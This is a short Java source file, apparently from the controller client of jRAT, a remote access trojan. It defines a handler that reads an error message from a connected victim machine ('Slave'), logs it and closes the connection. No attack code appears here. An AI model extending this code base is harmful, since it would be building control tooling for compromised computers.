package io.jrat.client.packets.incoming;

import io.jrat.client.Slave;
import io.jrat.client.exceptions.CloseException;
import io.jrat.client.ui.panels.PanelMainLog;

import java.io.DataInputStream;


public class Packet60Error extends AbstractIncomingPacket {

	@Override
	public void read(Slave slave, DataInputStream dis) throws Exception {
		String reason = slave.readLine();

		PanelMainLog.instance.addEntry("Error", slave, reason);

		slave.closeSocket(new CloseException("Error packet: " + reason));
	}

}
